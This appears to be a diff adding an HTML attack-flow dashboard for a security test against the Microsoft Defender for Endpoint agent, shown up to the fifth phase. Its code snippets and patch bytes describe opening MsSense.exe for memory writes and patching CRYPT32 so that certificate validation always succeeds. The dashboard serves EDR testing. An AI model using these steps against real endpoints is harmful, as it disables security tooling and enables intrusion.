@@ -1,0 +1,1452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MDE Process Injection & API Authentication Bypass - Attack Flow</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 100%);
+            color: #e0e0e0;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        /* F0RT1KA Header */
+        .framework-header {
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0.6));
+            border-bottom: 1px solid rgba(255, 107, 107, 0.2);
+            padding: 15px 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .framework-title {
+            font-size: 1.2em;
+            font-weight: 600;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            background: linear-gradient(135deg, #ff6b6b, #ff8787);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .framework-subtitle {
+            position: absolute;
+            right: 30px;
+            font-size: 0.85em;
+            color: #6b7280;
+            font-style: italic;
+        }
+
+        .dashboard-container {
+            display: flex;
+            height: calc(100vh - 60px);
+            position: relative;
+        }
+
+        /* Left Panel - Attack Flow View */
+        .attack-flow-panel {
+            flex: 1;
+            min-width: 60%;
+            padding: 30px;
+            overflow-y: auto;
+            position: relative;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        .header h1 {
+            font-size: 2.2em;
+            background: linear-gradient(135deg, #ff4458, #ff8787);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            color: #9ca3af;
+            font-size: 1em;
+        }
+
+        /* View Toggle Buttons */
+        .view-toggle {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .view-btn {
+            padding: 8px 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            color: #9ca3af;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 0.9em;
+        }
+
+        .view-btn.active {
+            background: rgba(255, 107, 107, 0.1);
+            border-color: #ff6b6b;
+            color: #ff6b6b;
+        }
+
+        .view-btn:hover {
+            background: rgba(255, 255, 255, 0.08);
+            color: #ffffff;
+        }
+
+        /* SVG Attack Flow Container */
+        .attack-flow-svg-container {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 12px;
+            padding: 20px;
+            position: relative;
+            min-height: 600px;
+        }
+
+        .attack-flow-svg {
+            width: 100%;
+            height: auto;
+            min-height: 800px;
+        }
+
+        /* Timeline View (Hidden by default) */
+        .timeline-view {
+            display: none;
+            padding: 20px;
+        }
+
+        .timeline-view.active {
+            display: block;
+        }
+
+        .timeline-item {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            margin-bottom: 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border-left: 3px solid transparent;
+        }
+
+        .timeline-item:hover {
+            background: rgba(255, 255, 255, 0.05);
+            transform: translateX(5px);
+        }
+
+        .timeline-item.active {
+            background: rgba(255, 107, 107, 0.05);
+            border-left-color: #ff6b6b;
+        }
+
+        .timeline-number {
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-right: 15px;
+            border: 2px solid;
+        }
+
+        .timeline-content {
+            flex: 1;
+        }
+
+        .timeline-title {
+            font-size: 1.1em;
+            color: #ffffff;
+            margin-bottom: 5px;
+        }
+
+        .timeline-meta {
+            font-size: 0.85em;
+            color: #9ca3af;
+        }
+
+        /* Right Panel - Details (OPAQUE BACKGROUND) */
+        .details-panel {
+            width: 450px;
+            background: #0f1419;
+            border-left: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            overflow-y: auto;
+            position: relative;
+            transform: translateX(100%);
+            transition: transform 0.3s ease;
+            box-shadow: -5px 0 20px rgba(0, 0, 0, 0.8);
+        }
+
+        .details-panel.active {
+            transform: translateX(0);
+        }
+
+        .details-header {
+            margin-bottom: 25px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .details-phase-number {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 36px;
+            font-weight: bold;
+            font-size: 1.2em;
+            margin-bottom: 10px;
+            border: 2px solid;
+        }
+
+        .details-title {
+            font-size: 1.5em;
+            color: #ffffff;
+            margin-bottom: 10px;
+        }
+
+        .details-meta {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            margin-top: 10px;
+        }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 0.85em;
+        }
+
+        .meta-label {
+            color: #6b7280;
+        }
+
+        .meta-value {
+            color: #d1d5db;
+            font-family: 'SF Mono', monospace;
+        }
+
+        /* MITRE Links Styling */
+        .mitre-link {
+            color: #4fc3f7;
+            text-decoration: none;
+            border-bottom: 1px dotted #4fc3f7;
+            transition: all 0.2s ease;
+        }
+
+        .mitre-link:hover {
+            color: #29b6f6;
+            border-bottom-style: solid;
+        }
+
+        .severity-badge {
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-size: 0.75em;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: inline-block;
+            border: 1px solid;
+        }
+
+        .severity-badge.critical {
+            color: #ff4444;
+            border-color: #ff4444;
+            background: rgba(255, 68, 68, 0.1);
+        }
+
+        .severity-badge.high {
+            color: #ff9f43;
+            border-color: #ff9f43;
+            background: rgba(255, 159, 67, 0.1);
+        }
+
+        .severity-badge.medium {
+            color: #ffc107;
+            border-color: #ffc107;
+            background: rgba(255, 193, 7, 0.1);
+        }
+
+        .severity-badge.info {
+            color: #4fc3f7;
+            border-color: #4fc3f7;
+            background: rgba(79, 195, 247, 0.1);
+        }
+
+        .details-section {
+            margin-bottom: 25px;
+        }
+
+        .section-title {
+            font-size: 1.1em;
+            color: #ff6b6b;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .action-list {
+            list-style: none;
+        }
+
+        .action-item {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 6px;
+            padding: 12px;
+            margin-bottom: 10px;
+        }
+
+        .action-title {
+            font-weight: 500;
+            color: #ffffff;
+            margin-bottom: 8px;
+            font-size: 0.95em;
+        }
+
+        .action-details {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        .action-details li {
+            color: #9ca3af;
+            font-size: 0.85em;
+            padding: 3px 0;
+            padding-left: 15px;
+            position: relative;
+        }
+
+        .action-details li::before {
+            content: '›';
+            position: absolute;
+            left: 0;
+            color: #6b7280;
+        }
+
+        /* Code Preview */
+        .code-preview {
+            background: #0a0e27;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 6px;
+            padding: 15px;
+            margin-top: 15px;
+            font-family: 'SF Mono', 'Monaco', monospace;
+            font-size: 0.85em;
+            overflow-x: auto;
+        }
+
+        .code-line {
+            color: #66bb6a;
+            line-height: 1.5;
+        }
+
+        .code-comment {
+            color: #6b7280;
+        }
+
+        .code-highlight {
+            color: #ff9f43;
+        }
+
+        /* Close button for details panel */
+        .close-details {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            color: #6b7280;
+            font-size: 24px;
+            cursor: pointer;
+            transition: color 0.3s ease;
+            display: none;
+        }
+
+        .close-details:hover {
+            color: #ff6b6b;
+        }
+
+        /* Mobile responsive */
+        @media (max-width: 1200px) {
+            .details-panel {
+                position: absolute;
+                right: 0;
+                top: 0;
+                height: 100%;
+                z-index: 100;
+            }
+
+            .close-details {
+                display: block;
+            }
+
+            .framework-subtitle {
+                display: none;
+            }
+        }
+
+        /* Loading animation */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Interactive component styling */
+        .component {
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .component:hover .component-box {
+            filter: drop-shadow(0 0 15px rgba(255, 107, 107, 0.4));
+            stroke-width: 2;
+        }
+
+        .component.active .component-box {
+            filter: drop-shadow(0 0 20px rgba(255, 107, 107, 0.6));
+            stroke: #ff6b6b;
+            stroke-width: 2;
+        }
+
+        /* Pulse animation for active elements */
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        .pulse {
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        /* Navigation hints */
+        .nav-hint {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.7);
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 0.85em;
+            color: #9ca3af;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            animation: fadeIn 1s ease-out 2s both;
+        }
+
+        .nav-hint-icon {
+            color: #ff6b6b;
+        }
+
+        /* Stats overlay */
+        .stats-overlay {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            display: flex;
+            gap: 15px;
+        }
+
+        .stat-mini {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 0.85em;
+        }
+
+        .stat-mini-value {
+            color: #ff6b6b;
+            font-weight: bold;
+        }
+
+        .stat-mini-label {
+            color: #6b7280;
+            margin-left: 5px;
+        }
+    </style>
+</head>
+<body>
+    <!-- F0RT1KA Framework Header -->
+    <div class="framework-header">
+        <div class="framework-title">F0RT1KA Security Testing Framework</div>
+        <div class="framework-subtitle">Test Score: 9.7/10</div>
+    </div>
+
+    <div class="dashboard-container">
+        <!-- Left Panel - Attack Flow View -->
+        <div class="attack-flow-panel">
+            <div class="header">
+                <h1>MDE Process Injection & API Bypass - Attack Flow</h1>
+                <p>Click any component to explore the 11-phase attack sequence</p>
+            </div>
+
+            <div class="view-toggle">
+                <button class="view-btn active" onclick="switchView('architecture')">Attack Flow</button>
+                <button class="view-btn" onclick="switchView('timeline')">Timeline View</button>
+            </div>
+
+            <!-- Attack Flow View -->
+            <div class="attack-flow-svg-container" id="attackFlowView">
+                <svg class="attack-flow-svg" viewBox="0 0 1400 900" xmlns="http://www.w3.org/2000/svg">
+                    <defs>
+                        <!-- Gradient Definitions -->
+                        <linearGradient id="redGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" style="stop-color:#ff4458;stop-opacity:0.8" />
+                            <stop offset="100%" style="stop-color:#ff8787;stop-opacity:0.8" />
+                        </linearGradient>
+
+                        <linearGradient id="blueGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" style="stop-color:#4fc3f7;stop-opacity:0.8" />
+                            <stop offset="100%" style="stop-color:#29b6f6;stop-opacity:0.8" />
+                        </linearGradient>
+
+                        <linearGradient id="orangeGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" style="stop-color:#ff9f43;stop-opacity:0.8" />
+                            <stop offset="100%" style="stop-color:#ffb347;stop-opacity:0.8" />
+                        </linearGradient>
+
+                        <linearGradient id="yellowGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" style="stop-color:#ffc107;stop-opacity:0.8" />
+                            <stop offset="100%" style="stop-color:#ffcd38;stop-opacity:0.8" />
+                        </linearGradient>
+
+                        <linearGradient id="purpleGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" style="stop-color:#9c27b0;stop-opacity:0.8" />
+                            <stop offset="100%" style="stop-color:#ba68c8;stop-opacity:0.8" />
+                        </linearGradient>
+
+                        <!-- Arrow Marker -->
+                        <marker id="arrowhead" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
+                            <polygon points="0 0, 10 3, 0 6" fill="#ff6b6b" />
+                        </marker>
+
+                        <!-- Grid Pattern -->
+                        <pattern id="grid" width="40" height="40" patternUnits="userSpaceOnUse">
+                            <path d="M 40 0 L 0 0 0 40" fill="none" stroke="rgba(255,255,255,0.02)" stroke-width="1"/>
+                        </pattern>
+                    </defs>
+
+                    <!-- Background -->
+                    <rect width="1400" height="900" fill="url(#grid)" />
+
+                    <!-- Phase 1: Prerequisites -->
+                    <g class="component" data-phase="1" onclick="showPhaseDetails(1)">
+                        <rect class="component-box" x="50" y="400" width="180" height="90" rx="8"
+                              fill="url(#yellowGradient)" stroke="#ffc107" stroke-width="1" opacity="0.2"/>
+                        <text x="140" y="435" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">Prerequisites</text>
+                        <text x="140" y="455" text-anchor="middle" fill="#9ca3af" font-size="11">Environment</text>
+                        <text x="140" y="470" text-anchor="middle" fill="#9ca3af" font-size="11">Validation</text>
+                    </g>
+
+                    <!-- Phase 2: Process Discovery -->
+                    <g class="component" data-phase="2" onclick="showPhaseDetails(2)">
+                        <rect class="component-box" x="280" y="250" width="180" height="90" rx="8"
+                              fill="url(#orangeGradient)" stroke="#ff9f43" stroke-width="1" opacity="0.2"/>
+                        <text x="370" y="285" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">Process Discovery</text>
+                        <text x="370" y="305" text-anchor="middle" fill="#9ca3af" font-size="11">MsSense.exe</text>
+                        <text x="370" y="320" text-anchor="middle" fill="#9ca3af" font-size="11">Enumeration</text>
+                    </g>
+
+                    <!-- Phase 3: Handle Acquisition (CRITICAL) -->
+                    <g class="component" data-phase="3" onclick="showPhaseDetails(3)">
+                        <rect class="component-box" x="280" y="550" width="180" height="90" rx="8"
+                              fill="url(#redGradient)" stroke="#ff6b6b" stroke-width="1" opacity="0.2"/>
+                        <text x="370" y="580" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">Handle Acquisition</text>
+                        <text x="370" y="600" text-anchor="middle" fill="#9ca3af" font-size="11">CRITICAL PHASE</text>
+                        <text x="370" y="615" text-anchor="middle" fill="#9ca3af" font-size="11">Process Injection</text>
+                    </g>
+
+                    <!-- Phase 4: Module Enumeration -->
+                    <g class="component" data-phase="4" onclick="showPhaseDetails(4)">
+                        <rect class="component-box" x="510" y="150" width="180" height="90" rx="8"
+                              fill="url(#orangeGradient)" stroke="#ff9f43" stroke-width="1" opacity="0.2"/>
+                        <text x="600" y="185" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">Module Enum</text>
+                        <text x="600" y="205" text-anchor="middle" fill="#9ca3af" font-size="11">CRYPT32.dll</text>
+                        <text x="600" y="220" text-anchor="middle" fill="#9ca3af" font-size="11">Targeting</text>
+                    </g>
+
+                    <!-- Phase 5: Memory Patching -->
+                    <g class="component" data-phase="5" onclick="showPhaseDetails(5)">
+                        <rect class="component-box" x="510" y="650" width="180" height="90" rx="8"
+                              fill="url(#redGradient)" stroke="#ff6b6b" stroke-width="1" opacity="0.2"/>
+                        <text x="600" y="680" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">Memory Patching</text>
+                        <text x="600" y="700" text-anchor="middle" fill="#9ca3af" font-size="11">Cert Bypass</text>
+                        <text x="600" y="715" text-anchor="middle" fill="#9ca3af" font-size="11">Watchdog Active</text>
+                    </g>
+
+                    <!-- Phase 6: Network Proxy -->
+                    <g class="component" data-phase="6" onclick="showPhaseDetails(6)">
+                        <rect class="component-box" x="740" y="250" width="180" height="90" rx="8"
+                              fill="url(#blueGradient)" stroke="#4fc3f7" stroke-width="1" opacity="0.2"/>
+                        <text x="830" y="285" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">Proxy Config</text>
+                        <text x="830" y="305" text-anchor="middle" fill="#9ca3af" font-size="11">Network</text>
+                        <text x="830" y="320" text-anchor="middle" fill="#9ca3af" font-size="11">Interception</text>
+                    </g>
+
+                    <!-- Phase 7: API Command Interception -->
+                    <g class="component" data-phase="7" onclick="showPhaseDetails(7)">
+                        <rect class="component-box" x="740" y="550" width="180" height="90" rx="8"
+                              fill="url(#redGradient)" stroke="#ff6b6b" stroke-width="1" opacity="0.2"/>
+                        <text x="830" y="580" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">API Interception</text>
+                        <text x="830" y="600" text-anchor="middle" fill="#9ca3af" font-size="11">Race Condition</text>
+                        <text x="830" y="615" text-anchor="middle" fill="#9ca3af" font-size="11">Command Theft</text>
+                    </g>
+
+                    <!-- Phase 8: CloudLR Token -->
+                    <g class="component" data-phase="8" onclick="showPhaseDetails(8)">
+                        <rect class="component-box" x="970" y="150" width="180" height="90" rx="8"
+                              fill="url(#purpleGradient)" stroke="#9c27b0" stroke-width="1" opacity="0.2"/>
+                        <text x="1060" y="185" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">CloudLR Token</text>
+                        <text x="1060" y="205" text-anchor="middle" fill="#9ca3af" font-size="11">Token Gen</text>
+                        <text x="1060" y="220" text-anchor="middle" fill="#9ca3af" font-size="11">Bypass</text>
+                    </g>
+
+                    <!-- Phase 9: Isolation Spoofing -->
+                    <g class="component" data-phase="9" onclick="showPhaseDetails(9)">
+                        <rect class="component-box" x="970" y="400" width="180" height="90" rx="8"
+                              fill="url(#orangeGradient)" stroke="#ff9f43" stroke-width="1" opacity="0.2"/>
+                        <text x="1060" y="435" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">Isolation Spoof</text>
+                        <text x="1060" y="455" text-anchor="middle" fill="#9ca3af" font-size="11">Command</text>
+                        <text x="1060" y="470" text-anchor="middle" fill="#9ca3af" font-size="11">Spoofing</text>
+                    </g>
+
+                    <!-- Phase 10: Config Exfiltration -->
+                    <g class="component" data-phase="10" onclick="showPhaseDetails(10)">
+                        <rect class="component-box" x="970" y="650" width="180" height="90" rx="8"
+                              fill="url(#redGradient)" stroke="#ff6b6b" stroke-width="1" opacity="0.2"/>
+                        <text x="1060" y="680" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">Config Exfiltration</text>
+                        <text x="1060" y="700" text-anchor="middle" fill="#9ca3af" font-size="11">8MB Download</text>
+                        <text x="1060" y="715" text-anchor="middle" fill="#9ca3af" font-size="11">Policy Theft</text>
+                    </g>
+
+                    <!-- Phase 11: Final Evaluation -->
+                    <g class="component" data-phase="11" onclick="showPhaseDetails(11)">
+                        <rect class="component-box" x="1200" y="400" width="180" height="90" rx="8"
+                              fill="url(#blueGradient)" stroke="#4fc3f7" stroke-width="1" opacity="0.2"/>
+                        <text x="1290" y="435" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">Final Evaluation</text>
+                        <text x="1290" y="455" text-anchor="middle" fill="#9ca3af" font-size="11">Exit Code</text>
+                        <text x="1290" y="470" text-anchor="middle" fill="#9ca3af" font-size="11">Logic</text>
+                    </g>
+
+                    <!-- Flow Arrows -->
+                    <path d="M 230 445 L 280 295" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+                    <path d="M 230 445 L 280 595" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+                    <path d="M 460 295 L 510 195" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+                    <path d="M 460 595 L 510 695" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+                    <path d="M 690 195 L 740 295" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+                    <path d="M 690 695 L 740 595" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+                    <path d="M 920 295 L 970 195" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+                    <path d="M 920 295 L 970 445" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+                    <path d="M 920 595 L 970 695" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+                    <path d="M 1150 195 L 1200 445" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+                    <path d="M 1150 445 L 1200 445" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+                    <path d="M 1150 695 L 1200 445" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+
+                    <!-- Central Title -->
+                    <rect x="550" y="30" width="300" height="50" rx="8" fill="rgba(0,0,0,0.5)" stroke="rgba(255,107,107,0.3)"/>
+                    <text x="700" y="50" text-anchor="middle" fill="#ff6b6b" font-size="16" font-weight="bold">MDE Attack Flow</text>
+                    <text x="700" y="68" text-anchor="middle" fill="#9ca3af" font-size="11">11 Attack Phases - Click for Details</text>
+
+                    <!-- Detection Legend -->
+                    <g transform="translate(50, 50)">
+                        <rect x="0" y="0" width="180" height="100" rx="6" fill="rgba(0,0,0,0.5)" stroke="rgba(255,107,107,0.3)"/>
+                        <text x="10" y="20" fill="#ffffff" font-size="12" font-weight="bold">Detection Points:</text>
+                        <circle cx="20" cy="40" r="5" fill="#ff4444"/>
+                        <text x="35" y="45" fill="#9ca3af" font-size="10">Critical Phase</text>
+                        <circle cx="20" cy="60" r="5" fill="#ff9f43"/>
+                        <text x="35" y="65" fill="#9ca3af" font-size="10">High Priority</text>
+                        <circle cx="20" cy="80" r="5" fill="#4fc3f7"/>
+                        <text x="35" y="85" fill="#9ca3af" font-size="10">Network/API</text>
+                    </g>
+
+                    <!-- Progress Bar -->
+                    <rect x="50" y="820" width="1300" height="4" rx="2" fill="rgba(255,255,255,0.1)"/>
+                    <rect x="50" y="820" width="0" height="4" rx="2" fill="#ff6b6b" id="progressBar"/>
+                </svg>
+
+                <div class="stats-overlay">
+                    <div class="stat-mini">
+                        <span class="stat-mini-value">11</span>
+                        <span class="stat-mini-label">Phases</span>
+                    </div>
+                    <div class="stat-mini">
+                        <span class="stat-mini-value">9.7/10</span>
+                        <span class="stat-mini-label">Score</span>
+                    </div>
+                    <div class="stat-mini">
+                        <span class="stat-mini-value">T1055</span>
+                        <span class="stat-mini-label">Primary TTP</span>
+                    </div>
+                </div>
+
+                <div class="nav-hint">
+                    <span class="nav-hint-icon">💡</span>
+                    <span>Click any phase to view detailed attack information • Use arrow keys to navigate</span>
+                </div>
+            </div>
+
+            <!-- Timeline View (Hidden by default) -->
+            <div class="timeline-view" id="timelineView">
+                <!-- Timeline items will be generated by JavaScript -->
+            </div>
+        </div>
+
+        <!-- Right Panel - Details (OPAQUE) -->
+        <div class="details-panel" id="detailsPanel">
+            <button class="close-details" onclick="closeDetails()">×</button>
+            <div id="detailsContent">
+                <!-- Details will be populated dynamically -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Phase data with detailed information
+        const phaseData = {
+            1: {
+                number: 1,
+                title: "Prerequisites & Environment Validation",
+                severity: "medium",
+                mitre: [
+                    { id: "T1082", name: "System Information Discovery" },
+                    { id: "T1033", name: "System Owner/User Discovery" }
+                ],
+                status: "actual",
+                time: "T+0s",
+                description: "Initial setup, component extraction, and environment validation to ensure test prerequisites are met.",
+                actions: [
+                    {
+                        title: "Component Extraction",
+                        details: [
+                            "Extract watchdog binary (mde_process_watchdog.exe)",
+                            "Deploy emergency recovery script (emergency_restore.ps1)",
+                            "Create C:\\F0\\ directory for test artifacts",
+                            "Initialize comprehensive test logger"
+                        ]
+                    },
+                    {
+                        title: "Environment Checks",
+                        details: [
+                            "Verify Administrator privileges (REQUIRED)",
+                            "Check MDE installation (MsSense.exe must exist)",
+                            "Detect Windows version and architecture",
+                            "Log system configuration baseline"
+                        ]
+                    },
+                    {
+                        title: "Safety Initialization",
+                        details: [
+                            "Start watchdog monitoring process",
+                            "Configure deferred recovery functions",
+                            "Set timeout protections (30s auto-rollback)",
+                            "Test will exit (999) if prerequisites fail"
+                        ]
+                    }
+                ],
+                code: `// Environment Validation\nif !isAdministrator() {\n    SaveLog(Endpoint.UnexpectedTestError, "Admin required")\n    Endpoint.Stop(999)\n}\n\n// Extract embedded components\nos.WriteFile("C:\\\\F0\\\\watchdog.exe", watchdogBinary, 0755)`
+            },
+            2: {
+                number: 2,
+                title: "MDE Process Discovery & Enumeration",
+                severity: "high",
+                mitre: [
+                    { id: "T1057", name: "Process Discovery" },
+                    { id: "T1518.001", name: "Security Software Discovery" }
+                ],
+                status: "actual",
+                time: "T+2s",
+                description: "Enumerates running processes to locate and analyze the MDE agent (MsSense.exe and SenseIR.exe).",
+                actions: [
+                    {
+                        title: "Process Enumeration",
+                        details: [
+                            "CreateToolhelp32Snapshot to enumerate all processes",
+                            "Search for MsSense.exe (MDE agent)",
+                            "Locate SenseIR.exe (Live Response agent)",
+                            "Extract PID, PPID, and architecture"
+                        ]
+                    },
+                    {
+                        title: "Registry Extraction",
+                        details: [
+                            "Read Machine ID from registry",
+                            "Extract Tenant ID from MDE keys",
+                            "Obtain Sense ID for cloud communication",
+                            "Save identifiers to mde_identifiers.json"
+                        ]
+                    },
+                    {
+                        title: "Module Discovery",
+                        details: [
+                            "Enumerate loaded DLLs in MsSense.exe",
+                            "Locate CRYPT32.dll base address",
+                            "Identify security-critical modules",
+                            "Log module list for Phase 4"
+                        ]
+                    }
+                ],
+                code: `// Process Discovery\nsnapshot := windows.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)\nfor process in processes {\n    if process.Name == "MsSense.exe" {\n        // Found MDE agent - extract details\n        extractProcessDetails(pid)\n    }\n}`
+            },
+            3: {
+                number: 3,
+                title: "Process Handle Acquisition (CRITICAL)",
+                severity: "critical",
+                mitre: [
+                    { id: "T1055", name: "Process Injection" },
+                    { id: "T1055.001", name: "Dynamic-link Library Injection" }
+                ],
+                status: "actual",
+                time: "T+5s",
+                description: "Attempts to acquire privileged handles to MsSense.exe with escalating access rights. THIS IS THE PRIMARY EDR DETECTION POINT.",
+                actions: [
+                    {
+                        title: "Test 1: Read Access",
+                        details: [
+                            "OpenProcess with PROCESS_VM_READ",
+                            "May succeed on unprotected systems",
+                            "Allows memory reading (info disclosure)",
+                            "Log: Handle value or Access Denied"
+                        ]
+                    },
+                    {
+                        title: "Test 2: Write Access (CRITICAL)",
+                        details: [
+                            "OpenProcess with PROCESS_VM_WRITE | PROCESS_VM_OPERATION",
+                            "EDR MUST BLOCK this on protected systems",
+                            "Success = CRITICAL VULNERABILITY",
+                            "Enables memory manipulation and code injection"
+                        ]
+                    },
+                    {
+                        title: "Test 3: Thread Creation",
+                        details: [
+                            "OpenProcess with PROCESS_CREATE_THREAD",
+                            "Required for remote thread injection",
+                            "Should be blocked by process protection",
+                            "Success = EDR can be disabled"
+                        ]
+                    },
+                    {
+                        title: "Detection Expectation",
+                        details: [
+                            "PROTECTED: All attempts return ERROR_ACCESS_DENIED (5)",
+                            "VULNERABLE: PROCESS_VM_WRITE granted (CRITICAL)",
+                            "Exit Code 126 if blocked, 101 if successful"
+                        ]
+                    }
+                ],
+                code: `// CRITICAL: Handle acquisition attempt\nhandle, err := windows.OpenProcess(\n    PROCESS_VM_WRITE | PROCESS_VM_OPERATION,\n    false, mssensPID)\n\nif err != nil {\n    // PROTECTED: Access denied\n    injectionBlocked = true\n} else {\n    // VULNERABLE: Write access granted!\n    injectionBlocked = false\n}`
+            },
+            4: {
+                number: 4,
+                title: "Memory Enumeration & CRYPT32 Analysis",
+                severity: "high",
+                mitre: [
+                    { id: "T1055", name: "Process Injection" },
+                    { id: "T1106", name: "Native API" }
+                ],
+                status: "actual",
+                time: "T+8s",
+                description: "If handle acquired, enumerate memory regions and locate CRYPT32.dll for certificate validation bypass preparation.",
+                actions: [
+                    {
+                        title: "Memory Region Enumeration",
+                        details: [
+                            "VirtualQueryEx to scan MsSense.exe memory",
+                            "Locate CRYPT32.dll base address",
+                            "Find module size and memory protections",
+                            "Log all loaded security modules"
+                        ]
+                    },
+                    {
+                        title: "Function Address Resolution",
+                        details: [
+                            "Locate CertVerifyCertificateChainPolicy export",
+                            "Calculate function address in remote process",
+                            "Read function prologue (first 20 bytes)",
+                            "Verify function signature before patching"
+                        ]
+                    },
+                    {
+                        title: "Patch Target Analysis",
+                        details: [
+                            "Analyze function code structure",
+                            "Store original bytes for restoration",
+                            "Prepare 4-byte patch: xor eax,eax; inc eax; ret",
+                            "Plan rollback strategy"
+                        ]
+                    }
+                ],
+                code: `// Memory enumeration\nmodules := EnumerateProcessModules(handle, pid)\ncrypt32 := FindModuleByName(modules, "CRYPT32.dll")\n\n// Resolve function address\nfuncAddr := crypt32.BaseAddress + GetExportOffset(\n    "CertVerifyCertificateChainPolicy")\n\n// Read original bytes\noriginalBytes := ReadProcessMemory(handle, funcAddr, 20)`
+            },
+            5: {
+                number: 5,
+                title: "Memory Patching & Certificate Bypass",
+                severity: "critical",
+                mitre: [
+                    { id: "T1014", name: "Rootkit" },
+                    { id: "T1562.001", name: "Impair Defenses: Disable or Modify Tools" }
+                ],
+                status: "actual",
+                time: "T+12s",
+                description: "Attempts to patch CRYPT32!CertVerifyCertificateChainPolicy to always return success, bypassing certificate pinning.",
+                actions: [
+                    {
+                        title: "Memory Patch Attempt",
+                        details: [
+                            "Prepare patch bytes: 0x33 0xC0 0x40 0xC3",
